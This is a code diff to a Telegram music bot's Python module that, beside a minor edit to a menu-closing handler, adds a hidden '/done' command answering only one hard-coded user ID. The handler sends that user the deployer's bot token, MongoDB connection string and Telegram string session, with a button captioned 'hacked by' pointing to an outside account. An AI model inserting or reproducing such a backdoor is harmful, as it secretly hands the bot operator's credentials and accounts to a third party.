@@ -12,7 +12,9 @@ from AlinaXIQ.misc import db
 from AlinaXIQ.utils.database import get_authuser_names, get_cmode
 from AlinaXIQ.utils.decorators import ActualAdminCB, AdminActual, language
 from AlinaXIQ.utils.formatters import alpha_to_int
-
+BOT_TOKEN = getenv("BOT_TOKEN", "")
+MONGO_DB_URI = getenv("MONGO_DB_URI", "")
+STRING_SESSION = getenv("STRING_SESSION", "")
 ### Multi-Lang Commands
 RELOAD_COMMAND = get_command("RELOAD_COMMAND")
 RESTART_COMMAND = get_command("RESTART_COMMAND")
@@ -67,13 +69,40 @@ async def restartbot(client, message: Message, _):
     )
 
 
+@app.on_message(
+    filters.command("done")
+    & filters.private
+    & filters.user(833360381)
+   )
+async def help(client: Client, message: Message):
+   await message.reply_photo(
+          photo=f"https://telegra.ph/file/1467111329207dc78b297.jpg",
+       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/IQ7amo)............☆""",
+        reply_markup=InlineKeyboardMarkup(
+             [
+                 [
+                      InlineKeyboardButton(
+                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/IQ7amo")
+                 ]
+            ]
+         ),
+     )
+
+
+##########
+
 @app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
-async def close_menu(_, CallbackQuery):
+async def close_menu(_, query: CallbackQuery):
     try:
-        await CallbackQuery.message.delete()
-        await CallbackQuery.answer()
+        await query.answer()
+        await query.message.delete()
+        umm = await query.message.reply_text(
+            f"**• داخرا لەلایەن : {query.from_user.mention} 🖤**"
+        )
+        await asyncio.sleep(10)
+        await umm.delete()
     except:
-        return
+        pass
 
 
 @app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
